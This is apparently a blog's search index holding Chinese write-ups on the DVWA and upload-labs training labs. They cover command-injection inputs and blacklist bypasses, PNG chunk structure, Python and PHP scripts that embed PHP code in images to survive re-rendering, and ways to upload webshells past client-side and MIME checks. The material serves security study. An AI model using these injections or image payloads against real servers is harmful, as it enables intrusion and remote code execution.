<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>DVWA||Command Injection</title>
    <link href="/2021/01/26/dvwa4/"/>
    <url>/2021/01/26/dvwa4/</url>
    
    <content type="html"><![CDATA[<p>命令注入攻击的常见场景为：仅仅需要输入数据的场合，攻击者构造数据同时输入了恶意命令代码，而系统对此并未过滤，恶意命令代码一并执行，最终导致信息泄露或者正常数据的破坏；PHP命令注入攻击漏洞是PHP应用程序中常见的脚本漏洞之一。命令注入和代码注入不同，代码注入的目的在于将外部代码注入应用程序本身，并随程序执行；命令攻击的对象是服务器的宿主机。因此用户可以通过构造特殊的输入来达到入侵目的。</p><p>先介绍一下<code>ping</code>:</p><p>Ping是潜水艇人员的专用术语，表示回应的声纳脉冲，在网络中Ping是TCP/IP工具。是用来检测网络的连通情况和分析网络速度。</p><p><img src="/2021/01/26/dvwa4/3.jpg" alt="3"></p><p>ping返回信息的含义</p><table><thead><tr><th>返回信息</th><th>分析</th></tr></thead><tbody><tr><td>Request timed out</td><td>(1)对方已关机，或者网络上没有这个地址                                                                                    (2)对方与本机不在同一网段内                                                                                                 (3)对方确实存在，但设置了ICMP数据包过滤(比如防火墙设置)，可以用带参数 -a 的Ping命令探测对方，如果能得到对方的<code>NETBIOS</code>名称，则说明对方是存在的，有防火墙设置，如果得不到就如(1),(2)                                                                                          (4)错误设置IP地址(TCP/IP设置中，设置了一个与网卡IP地址处于同一子网的IP地址)</td></tr><tr><td>Destination host Unreachable</td><td>(1)对方与本机不在同一网段内，而本机未设置默认的路由                                        　(2) 网线 出了故障                                                                                                                                  <strong>本回应与<code>time out</code>的区别：<code>timeout</code>：所经过的路由器的路由表中具有到达目标的路由，而目标因为其他原因不可到达，本回应：路由表中连到达目标的路由都没有</strong></td></tr><tr><td>Bad IP address</td><td>这个信息表示您可能没有连接到DNS服务器，所以无法解析这个IP地址，也可能是IP地址不存在。</td></tr><tr><td>Source quench received</td><td>对方或中途的服务器繁忙无法回应</td></tr><tr><td>Unknown host</td><td>该远程主机的名字不能被域名服务器(DNS)转换成IP地址。可能是域名服务器有故障，或者其名字不正确，或者网络管理员的系统与远程主机之间的通信线路有故障</td></tr><tr><td>No answer</td><td>本地系统有一条通向中心主机的路由，但却接收不到它发给中心主机的任何信息。原因可能是：中心主机没有工作;本地或中心主机网络配置不正确;本地或中心的路由器没有工作;通信线路有故障;中心主机存在路由选择问题</td></tr><tr><td>no rout to host</td><td>网卡工作不正常</td></tr><tr><td>transmit fai led，error code</td><td>10043网卡驱动不正常</td></tr><tr><td>unknown host name</td><td>DNS配置不正确</td></tr></tbody></table><p>详情：<a href="https://blog.csdn.net/hezeyujiang/article/details/79504038">ping命令详解</a></p><p>输入ip，程序调用系统命令ping这个ip。在ip后面加<code>&amp;&amp;、&amp;、|、||</code>命令拼接符号再跟上自己需要执行的系统命令就构成了命令注入</p><table><thead><tr><th align="center">A&amp;B</th><th align="center">A&amp;&amp;B</th><th align="center">A|B</th><th align="center">A||B</th></tr></thead><tbody><tr><td align="center">AB之间无制约关系</td><td align="center">A执行成功才执行B</td><td align="center">A的输出作为B的输出</td><td align="center">A执行失败才执行B</td></tr></tbody></table><h2 id="low"><a href="#low" class="headerlink" title="low"></a>low</h2><p>源码出现了一个函数：<code>stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; )</code></p><p><code>stristr() </code>函数搜索字符串在另一字符串中的第一次出现，返回字符串的剩余部分（从匹配点），如果未找到所搜索的字符串，返回 FALSE。</p><p>格式：</p><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">stristr</span><span class="hljs-params">(string,search,before_search)</span></span></code></pre><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><em>string</em></td><td align="left">必需。规定被搜索的字符串。</td></tr><tr><td align="left"><em>search</em></td><td align="left">必需。规定要搜索的字符串。如果该参数是数字，则搜索匹配该数字对应的 ASCII 值的字符。</td></tr><tr><td align="left"><em>before_search</em></td><td align="left">可选。默认值为 “false” 的布尔值。如果设置为 “true”，它将返回 <em>search</em> 参数第一次出现之前的字符串部分。</td></tr></tbody></table><p><code>php_uname()</code>:</p><p>返回运行php的操作系统的相关描述，本关参数mode可取：<code>a</code>包含所有模式</p><table><thead><tr><th align="center">s</th><th align="center">n</th><th align="center">r</th><th align="center">v</th><th align="center">m</th></tr></thead><tbody><tr><td align="center">操作系统名称</td><td align="center">主机名</td><td align="center">版本</td><td align="center">版本信息</td><td align="center">机器类型</td></tr></tbody></table><p>从源码来看，本关对ip参数并未做任何的过滤。</p><p>先测试一下本地端</p><p><img src="/2021/01/26/dvwa4/1.jpg" alt="1"></p><p><code>bytes</code>：数据包大小，也就是字节</p><p><code>time</code>值：响应往返时间，这个时间越小，说明连接这个地址速度越快。</p><p><code>TTL</code>值：<code>Time To Live</code>,表示DNS记录在DNS服务器上存在的时间，它是IP协议包的一个值，告诉路由器该数据包何时需要被丢弃。可以通过Ping返回的TTL值大小，粗略地判断目标系统类型是Windows系列还是UNIX/Linux系列,<strong>通常情况下，Linux系统的TTL值为64或255，WindowsNT/2000/XP系统的TTL值为128，Windows98系统的TTL值为32，UNIX主机的TTL值为255</strong>，上图为Linux下的测试结果。</p><p><code>Sent</code>发送多个秒包、</p><p><code>Received </code>收到多个回应包</p><p><code>Lost </code>丢弃了多少个包，<code>lost=0</code>时即为网络状态良好</p><p>响应时间<code>Minmum</code> 最小值、<code>MAXimun </code>最大值、<code>Average </code>平均值</p><p>测看看它能不能执行任意命令:<code>127.0.0.1&amp;&amp;echo 小天才</code></p><img src="/2021/01/26/dvwa4/2.jpg" alt="2" style="zoom:80%;"><p>看来是可以的。本关并无过滤，执行其他命令皆可</p><h2 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h2><pre><code class="hljs php">$substitutions = <span class="hljs-keyword">array</span>( <span class="hljs-string">&#x27;&amp;&amp;&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;;&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>, ）；</code></pre><p>源码中执行了以上过滤操作，跟黑名单差不多，可使用<code>&amp;</code>,<code>&amp;;&amp;</code>( <code>;</code>会被替换为空字符,故执行后又会变成<code>&amp;&amp;</code>)</p><h2 id="high"><a href="#high" class="headerlink" title="high"></a>high</h2><pre><code class="hljs php">$substitutions = <span class="hljs-keyword">array</span>( <span class="hljs-string">&#x27;&amp;&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;;&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;|  &#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;-&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;$&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;(&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;)&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;||&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>, );</code></pre><p>本关只是把黑名单的范围扩大了。但仔细观察可以发现<code>&#39;|  &#39; =&gt; &#39;&#39;</code>中|后面有一个空格，所以<code>|</code>并没有被过滤。</p><h2 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h2><p>分析源码：</p><p>熟悉的<code>Anti-CSRF token </code>不再介绍，源码中还进行如下限制</p><pre><code class="hljs arcade"><span class="hljs-comment">// Check IF each octet is an integer </span> <span class="hljs-keyword">if</span>( ( is_numeric( <span class="hljs-symbol">$octet</span>[<span class="hljs-number">0</span>] ) ) &amp;&amp; ( is_numeric( <span class="hljs-symbol">$octet</span>[<span class="hljs-number">1</span>] ) ) &amp;&amp; ( is_numeric( <span class="hljs-symbol">$octet</span>[<span class="hljs-number">2</span>] ) ) &amp;&amp; ( is_numeric( <span class="hljs-symbol">$octet</span>[<span class="hljs-number">3</span>] ) ) &amp;&amp; ( sizeof( <span class="hljs-symbol">$octet</span> ) == <span class="hljs-number">4</span> ) ) &#123;      <span class="hljs-comment">// If all 4 octets are int&#x27;s put the IP back together. </span>     <span class="hljs-symbol">$target</span> = <span class="hljs-symbol">$octet</span>[<span class="hljs-number">0</span>] . <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-symbol">$octet</span>[<span class="hljs-number">1</span>] . <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-symbol">$octet</span>[<span class="hljs-number">2</span>] . <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-symbol">$octet</span>[<span class="hljs-number">3</span>];</code></pre><p>只有数字.数字.数字.数字的格式才行。相当于黑名单。</p><p> <code>stripslashes()</code>：删除字符串string中的反斜杠</p><p><code>is_numeric()</code>和<code>explode()</code>在之前的SQL注入模块都讲过了，不再赘述。</p><p>发现每个模块的impossible里似乎都有这几个家伙。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>虽然此漏洞很厉害，可以直接执行系统命令，但这个漏洞应该不常见（毕竟这么明显，又能让用户执行cmd）</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>二次渲染&amp;&amp;png结构分析</title>
    <link href="/2021/01/24/png/"/>
    <url>/2021/01/24/png/</url>
    
    <content type="html"><![CDATA[<h2 id="一-PNG的文件结构"><a href="#一-PNG的文件结构" class="headerlink" title="一.PNG的文件结构"></a>一.PNG的文件结构</h2><h4 id="数据块构成结构"><a href="#数据块构成结构" class="headerlink" title="数据块构成结构"></a>数据块构成结构</h4><p>png定义了两种类型的数据块</p><blockquote><p>关键数据块(critical chunk)//关键数据块定义了4个标准数据块，每个PNG文件都必须包含它们，PNG读写软件也都必须要支持这些数据块。</p></blockquote><blockquote><blockquote><ul><li>PNG标识符</li><li>PNG数据块(IHDR)</li><li>PNG数据块(其他类型数据块)</li><li>PNG结尾数据块(IEND)</li></ul></blockquote></blockquote><blockquote><p>辅助数据块(ancillary chunks)</p></blockquote><h4 id="PNG文件格式中的数据块"><a href="#PNG文件格式中的数据块" class="headerlink" title="PNG文件格式中的数据块"></a>PNG文件格式中的数据块</h4><table><thead><tr><th><strong>数据块符号</strong></th><th><strong>数据块名称</strong></th><th><strong>多数据块</strong></th><th><strong>可选否</strong></th><th><strong>位置限制</strong></th></tr></thead><tbody><tr><td>IHDR</td><td>文件头数据块</td><td>否</td><td>否</td><td>第一块</td></tr><tr><td>cHRM</td><td>基色和白色点数据块</td><td>否</td><td>是</td><td>在PLTE和IDAT之前</td></tr><tr><td>gAMA</td><td>图像γ数据块</td><td>否</td><td>是</td><td>在PLTE和IDAT之前</td></tr><tr><td>sBIT</td><td>样本有效位数据块</td><td>否</td><td>是</td><td>在PLTE和IDAT之前</td></tr><tr><td>PLTE</td><td>调色板数据块</td><td>否</td><td>是</td><td>在IDAT之前</td></tr><tr><td>bKGD</td><td>背景颜色数据块</td><td>否</td><td>是</td><td>在PLTE之后IDAT之前</td></tr></tbody></table><p>PS：数据块的类别还有很多，以上只是一部分。</p><h4 id="数据块结构"><a href="#数据块结构" class="headerlink" title="数据块结构"></a>数据块结构</h4><p>PNG中，每个数据块由4个部分组成，如下：</p><table><thead><tr><th><strong>名称</strong></th><th><strong>字节数</strong></th><th><strong>说明</strong></th></tr></thead><tbody><tr><td>Length (长度)</td><td>4字节</td><td>指定数据块中数据域的长度，其长度不超过(231－1)字节</td></tr><tr><td>Chunk Type Code (数据块类型码)</td><td>4字节</td><td>数据块类型码由ASCII字母(A-Z和a-z)组成的“<strong>数据块符号”</strong></td></tr><tr><td>Chunk Data (数据块数据)</td><td>可变长度</td><td>存储按照Chunk Type Code指定的数据</td></tr><tr><td>CRC (循环冗余检测)</td><td>4字节</td><td>存储用来检测是否有错误的循环冗余码</td></tr></tbody></table><p>CRC(cyclic redundancy check)域中的值是对Chunk Type Code域和Chunk Data域中的数据进行计算得到的。CRC值算法：</p><p><img src="/2021/01/24/png/1.jpg" alt="1"></p><h2 id="二-PNG图像标识符"><a href="#二-PNG图像标识符" class="headerlink" title="二.PNG图像标识符"></a>二.PNG图像标识符</h2><p>PNG文件头位置由位固定的字节来描述：</p><table><thead><tr><th>十进制数</th><th>137 80 78 71 13 10 26 10</th></tr></thead><tbody><tr><td>十六进制数</td><td>89 50 4E 47 0D 0A 1A 0A</td></tr></tbody></table><p>PEG，PNG,GIF,BMP等图片都具有不同的图像标识符号，判断文件的mimeType类型，应该通过标识符,而不是通过后缀名判断，因为后缀名可以随便修改（之前upload-labs里有提到)</p><h2 id="三-数据块"><a href="#三-数据块" class="headerlink" title="三.数据块"></a>三.数据块</h2><h4 id="IHDR数据块"><a href="#IHDR数据块" class="headerlink" title="IHDR数据块"></a>IHDR数据块</h4><p>包含有PNG文件中存储的图像数据的基本信息，且作为第一个数据块出现在PNG数据流中，一个PNG数据流中只能有一个文件头数据块。文件头数据块由13字节组成，格式如下:</p><table><thead><tr><th><strong>域的名称</strong></th><th><strong>字节数</strong></th><th><strong>说明</strong></th></tr></thead><tbody><tr><td>Width</td><td>4 bytes</td><td>图像宽度，以像素为单位</td></tr><tr><td>Height</td><td>4 bytes</td><td>图像高度，以像素为单位</td></tr><tr><td>Bit depth</td><td>1 byte</td><td>图像深度：  索引彩色图像：1，2，4或8  灰度图像：1，2，4，8或16  真彩色图像：8或16</td></tr><tr><td>ColorType</td><td>1 byte</td><td>颜色类型： 0：灰度图像, 1，2，4，8或16  2：真彩色图像，8或16  3：索引彩色图像，1，2，4或8  4：带α通道数据的灰度图像，8或16  6：带α通道数据的真彩色图像，8或16</td></tr><tr><td>Compression method</td><td>1 byte</td><td>压缩方法(LZ77派生算法)</td></tr><tr><td>Filter method</td><td>1 byte</td><td>滤波器方法</td></tr><tr><td>Interlace method</td><td>1 byte</td><td>隔行扫描方法： 0：非隔行扫描  1： Adam7(由Adam M. Costello开发的7遍隔行扫描方法)</td></tr></tbody></table><h4 id="PLTE"><a href="#PLTE" class="headerlink" title="PLTE"></a>PLTE</h4><p>PLTE定义图像的调色板信息,仅与索引彩色图像有关，而且要放在图像数据块之前。它可以包含1~256个调色板信息，每一个调色板信息由3个字节组成，分别为红黄蓝，各占一个字节，0是为黑，255为最大值。调色板PLTE数据块是辅助数据块,对于索引图像，调色板信息是必须的，调色板的颜色索引从0开始编号，然后是1、2……，调色板的颜色数不能超过色深中规定的颜色数，否则PNG图像不合法。 </p><h4 id="IDAT"><a href="#IDAT" class="headerlink" title="IDAT"></a>IDAT</h4><p>图像数据块IDAT(image data chunk)：它存储实际的数据，在数据流中可包含多个连续顺序的图像数据块.IDAT存放着图像真正的数据信息。</p><h4 id="IEND"><a href="#IEND" class="headerlink" title="IEND"></a>IEND</h4><p>标记PNG文件或者数据流已经结束，放在文件的尾部。文件的结尾12个字符总是<code>00 00 00 00 49 45 4E 44 AE 42 60 82 </code>,IEND数据块的长度总是0，数据标识总是IEND<code>49 45 4E 44</code>（前面upload有提到）</p><p>以下分析实例：</p><img src="/2021/01/24/png/1.png" alt="1" style="zoom:50%;"><p>上图为png格式图片，十六进制分析一下</p><img src="/2021/01/24/png/2.jpg" alt="2" style="zoom:50%;"><p>前八位符合png的头文件标识。</p><img src="/2021/01/24/png/3.jpg" alt="3" style="zoom:50%;"><p>图示范围就是IHDR数据块，</p><ul><li>00 00 00 0D 说明IHDR头块长为13</li><li>49 48 44 52 IHDR标识</li><li>00 00 01 94 图像的宽，404像素</li><li>00 00 01 2E 图像的高，302像素</li><li>08 色深，2^8=256，即这是一个满色的图像</li><li>06 颜色类型，索引图像</li><li>00 PNG Spec规定此处总为0（非0值为将来使用更好的压缩方法预留），表示使压缩方法(LZ77派生算法)</li><li>00 同上</li><li>00 非隔行扫描</li><li><code>A9 94 E4 B3 </code>CRC校验</li></ul><p>接下去的数据到<code>50 4C 54 45 （PLTE标识）</code>前5个都为数据块sBIT,颜色采样率。</p><img src="/2021/01/24/png/4.jpg" alt="4" style="zoom: 33%;"><p>PLTE标识前四个为调色板信息，之后还会有<code>49 44 41 54 IDAT标识</code>,文件过大不一一找出，最后面</p><img src="/2021/01/24/png/5.jpg" alt="5" style="zoom:50%;"><p>如前面所讲。由于辅助数据块都为可选部分，可以通过删除所有的辅助数据块来减少PNG文件的大小。png介绍到这里结束，接下来回归upload-17的png二次渲染绕过。</p><h4 id="写入PLTE数据块"><a href="#写入PLTE数据块" class="headerlink" title="写入PLTE数据块"></a>写入PLTE数据块</h4><p>php底层对PLTE数据块进行了CRC校验.故可再chunk data域插入php代码,然后重新计算相应的crc值并修改。<strong>此方式只对索引彩色图像的png图片有效</strong>在选取png图片时可根据IHDR数据块的color type辨别。假设php代码为<code>&lt;?php phpinfo();?&gt;</code>进行十六进制逐个编码后为<code>3C 3F 70 68 70 20 70 68 70 69 6E 66 6F 28 29 3B 3F 3E</code>找到PLTE标识后将其后18个数据改为代码的编码，然后再计算PLTE数据块的CRC，脚本如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import binascii</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">png &#x3D; open(r&#39;2.png&#39;,&#39;rb&#39;)</span><br><span class="line">a &#x3D; png.read()</span><br><span class="line">png.close()</span><br><span class="line">hexstr &#x3D; binascii.b2a_hex(a)</span><br><span class="line"></span><br><span class="line">&#39;&#39;&#39; PLTE crc &#39;&#39;&#39;</span><br><span class="line">data &#x3D;  &#39;504c5445&#39;+ re.findall(&#39;504c5445(.*?)49444154&#39;,hexstr)[0]</span><br><span class="line">crc &#x3D; binascii.crc32(data[:-16].decode(&#39;hex&#39;)) &amp; 0xffffffff</span><br><span class="line">print hex(crc)</span><br></pre></td></tr></table></figure><p>摘自<a href="https://www.zhaosimeng.cn/writeup/72.html">upload-labs</a></p><p>后将CRC值改为运行后的，将此图片上传，即可。</p><p>还有一种思路：写入IDAT数据块</p><p>直接运行脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$p &#x3D; array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,</span><br><span class="line">           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,</span><br><span class="line">           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,</span><br><span class="line">           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,</span><br><span class="line">           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,</span><br><span class="line">           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,</span><br><span class="line">           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,</span><br><span class="line">           0x66, 0x44, 0x50, 0x33);</span><br><span class="line"></span><br><span class="line">$img &#x3D; imagecreatetruecolor(32, 32);</span><br><span class="line"></span><br><span class="line">for ($y &#x3D; 0; $y &lt; sizeof($p); $y +&#x3D; 3) &#123;</span><br><span class="line">   $r &#x3D; $p[$y];</span><br><span class="line">   $g &#x3D; $p[$y+1];</span><br><span class="line">   $b &#x3D; $p[$y+2];</span><br><span class="line">   $color &#x3D; imagecolorallocate($img, $r, $g, $b);</span><br><span class="line">   imagesetpixel($img, round($y &#x2F; 3), 0, $color);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">imagepng($img,&#39;.&#x2F;00.png&#39;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>摘自<a href="https://www.zhaosimeng.cn/writeup/72.html">upload-labs</a></p><p>jpg也是运用脚本，先上传一张图片在将图片下载至本地用脚本运行再重新上传即可，脚本依旧再上面的链接里。二次渲染就结束啦~~</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>upload-labs</title>
    <link href="/2021/01/24/upload/"/>
    <url>/2021/01/24/upload/</url>
    
    <content type="html"><![CDATA[<ul><li><a href="#pass-01%E5%89%8D%E7%AB%AFjs%E7%BB%95%E8%BF%87">Pass-01(前端js绕过)</a><ul><li><a href="#%E5%88%A0%E9%99%A4js%E6%A0%A1%E9%AA%8C%E4%BB%A3%E7%A0%81">删除js校验代码</a></li><li><a href="#%E6%9B%B4%E6%94%B9js%E6%A0%A1%E9%AA%8C%E4%B8%AD%E7%9A%84%E7%99%BD%E5%90%8D%E5%8D%95">更改js校验中的白名单</a></li><li><a href="#%E5%85%88%E6%94%B9%E6%96%87%E4%BB%B6%E5%90%8E%E7%BC%80%E5%90%8D%E9%80%9A%E8%BF%87js%E6%A0%A1%E9%AA%8C%E5%86%8D%E6%8A%93%E5%8C%85%E6%9B%B4%E6%94%B9%E5%90%8E%E7%BC%80%E4%B8%8A%E4%BC%A0%E8%87%B3%E6%9C%8D%E5%8A%A1%E5%99%A8">先改文件后缀名通过js校验再抓包更改后缀上传至服务器</a></li></ul></li><li><a href="#pass-02mime%E9%AA%8C%E8%AF%81">Pass-02(MIME验证)</a></li><li><a href="#pass-03%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87">Pass-03(黑名单绕过)</a></li><li><a href="#pass-04%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87-htaccess">Pass-04(黑名单绕过-.htaccess)</a></li><li><a href="#pass-05%E9%BB%91%E5%90%8D%E5%8D%95%E9%AA%8C%E8%AF%81userini">Pass-05（黑名单验证，.user.ini.）</a></li><li><a href="#pass-06%E9%BB%91%E5%90%8D%E5%8D%95%E9%AA%8C%E8%AF%81-%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87">Pass-06(黑名单验证-大小写绕过)</a></li><li><a href="#pass-07%E9%BB%91%E5%90%8D%E5%8D%95%E9%AA%8C%E8%AF%81%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87">Pass-07(黑名单验证–空格绕过)</a></li><li><a href="#pass-08%E9%BB%91%E5%90%8D%E5%8D%95%E9%AA%8C%E8%AF%81%E7%82%B9%E5%8F%B7%E7%BB%95%E8%BF%87">Pass-08（黑名单验证–点号绕过）</a></li><li><a href="#pass-09%E9%BB%91%E5%90%8D%E5%8D%95%E9%AA%8C%E8%AF%81%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6data%E7%BB%95%E8%BF%87">Pass-09(黑名单验证–特殊字符::$DATA绕过)</a></li><li><a href="#pass-10%E9%BB%91%E5%90%8D%E5%8D%95-%E5%8D%95%E6%AC%A1%E5%A4%84%E7%90%86">Pass-10（黑名单-单次处理）</a></li><li><a href="#pass-11%E9%BB%91%E5%90%8D%E5%8D%95-%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87">Pass-11（黑名单-双写绕过)</a></li><li><a href="#pass-12%E7%99%BD%E5%90%8D%E5%8D%95-0x00%E6%88%AA%E6%96%AD-get%E5%9E%8B">Pass-12（白名单-0x00截断-GET型)</a></li><li><a href="#pass-13%E7%99%BD%E5%90%8D%E5%8D%95-0x00%E6%88%AA%E6%96%AD-post%E5%9E%8B">Pass-13（白名单-0x00截断-POST型)</a></li><li><a href="#pass-14%E7%99%BD%E5%90%8D%E5%8D%95-%E5%9B%BE%E7%89%87%E9%A9%AC">Pass-14（白名单-图片马)</a></li><li><a href="#pass-15%E7%99%BD%E5%90%8D%E5%8D%95-%E5%9B%BE%E7%89%87%E9%A9%AC-getimagesize">Pass-15(白名单-图片马-getimagesize())</a></li><li><a href="#pass-16%E7%99%BD%E5%90%8D%E5%8D%95-%E5%9B%BE%E7%89%87%E9%A9%AC-exif_imagetype">Pass-16(白名单-图片马-exif_imagetype())</a></li><li><a href="#pass-17%E7%99%BD%E5%90%8D%E5%8D%95-%E5%9B%BE%E7%89%87%E9%A9%AC-%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93">Pass-17(白名单-图片马-二次渲染)</a></li><li><a href="#pass-18%E7%99%BD%E5%90%8D%E5%8D%95-%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89-%E6%97%B6%E9%97%B4">Pass-18（白名单-条件竞争-时间)</a></li><li><a href="#pass-19%E7%99%BD%E5%90%8D%E5%8D%95-%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89-%E5%9B%BE%E7%89%87%E9%A9%AC">Pass-19（白名单-条件竞争-图片马)</a></li><li><a href="#pass-20%E9%BB%91%E5%90%8D%E5%8D%95%E9%AA%8C%E8%AF%81-%E7%82%B9%E5%8F%B7%E7%BB%95%E8%BF%87">Pass-20（黑名单验证-点号绕过……)</a></li><li><a href="#pass-21%E7%99%BD%E5%90%8D%E5%8D%95%E9%AA%8C%E8%AF%81-%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87">Pass-21（白名单验证-数组绕过)</a></li><li><a href="#%E6%80%BB%E7%BB%93">总结</a><h2 id="文件上传漏洞介绍"><a href="#文件上传漏洞介绍" class="headerlink" title="文件上传漏洞介绍"></a>文件上传漏洞介绍</h2></li></ul><p>web应用程序通常带有文件上传的功能，比如在博客发表文章需要上传图片等行为就可能存在文件上传漏洞。文件上传漏洞就是利用网页代码中的文件上传路径变量过滤不严将可执行的文件上传到一个到服务器中，再通过URL去访问以执行恶意代码。攻击者可以直接上传WebShell（以asp、php或者jsp等网页文件形式存在的一种命令执行环境，也可以将其称做为一种网页后门）到服务器上。详情：<a href="https://segmentfault.com/a/1190000016012608">文件上传漏洞</a></p><p>共有以下几种类型：</p><p><img src="/2021/01/24/upload/2.jpg" alt="2"></p><p>（做了m久的思维导图………)</p><h1 id="Pass-01-前端js绕过"><a href="#Pass-01-前端js绕过" class="headerlink" title="Pass-01(前端js绕过)"></a>Pass-01(前端js绕过)</h1><p>页面要求上传webshell，随意写一个php上传(一句话木马在本地端不直观)后：</p><img src="/2021/01/24/upload/1.jpg" alt="1" style="zoom:67%;"><p>查看源码发现为js前端验证，且定义了一个白名单，只让图示几种格式通过。js前端验证有以下几种思路：</p><p>1、删除js校验代码</p><p>2、更改js校验中的白名单</p><p>3、先改文件后缀名通过js校验再抓包更改后缀上传至服务器</p><h3 id="删除js校验代码"><a href="#删除js校验代码" class="headerlink" title="删除js校验代码"></a>删除js校验代码</h3><p>本来可以在firebug进行删改，新版火狐没有这个插件了，只能通过源代码或者抓包进行删改了。将验证函数删除即可：</p><p><img src="/2021/01/24/upload/4.jpg" alt="4"></p><h3 id="更改js校验中的白名单"><a href="#更改js校验中的白名单" class="headerlink" title="更改js校验中的白名单"></a>更改js校验中的白名单</h3><p>将PHP格式加上：</p><p><img src="/2021/01/24/upload/3.jpg" alt="3"></p><h3 id="先改文件后缀名通过js校验再抓包更改后缀上传至服务器"><a href="#先改文件后缀名通过js校验再抓包更改后缀上传至服务器" class="headerlink" title="先改文件后缀名通过js校验再抓包更改后缀上传至服务器"></a>先改文件后缀名通过js校验再抓包更改后缀上传至服务器</h3><p>先将PHP后缀改为jpg格式的图片，上传时进行抓包拦截，再修改后缀:</p><p><img src="/2021/01/24/upload/6.jpg" alt="6"></p><p>上传成功~~</p><p><img src="/2021/01/24/upload/5.jpg" alt="5"></p><h1 id="Pass-02-MIME验证"><a href="#Pass-02-MIME验证" class="headerlink" title="Pass-02(MIME验证)"></a>Pass-02(MIME验证)</h1><p>提示显示进行MIME校验：</p><p>MIME(Multipurpose Internet Mail  Extensions)多用途互联网邮件扩展类型。是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式。在HTTP中，MIME类型被定义在Content-Type header中。</p><p>常见类型：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">audio&#x2F;mpeg -&gt; .mp3</span><br><span class="line">application&#x2F;msword -&gt; .doc</span><br><span class="line">application&#x2F;octet-stream -&gt; .exe</span><br><span class="line">application&#x2F;pdf -&gt; .pdf</span><br><span class="line">application&#x2F;x-javascript -&gt; .js</span><br><span class="line">application&#x2F;x-rar -&gt; .rar</span><br><span class="line">application&#x2F;zip -&gt; .zip</span><br><span class="line">image&#x2F;gif -&gt; .gif</span><br><span class="line">image&#x2F;jpeg -&gt; .jpg &#x2F; .jpeg</span><br><span class="line">image&#x2F;png -&gt; .png</span><br><span class="line">text&#x2F;plain 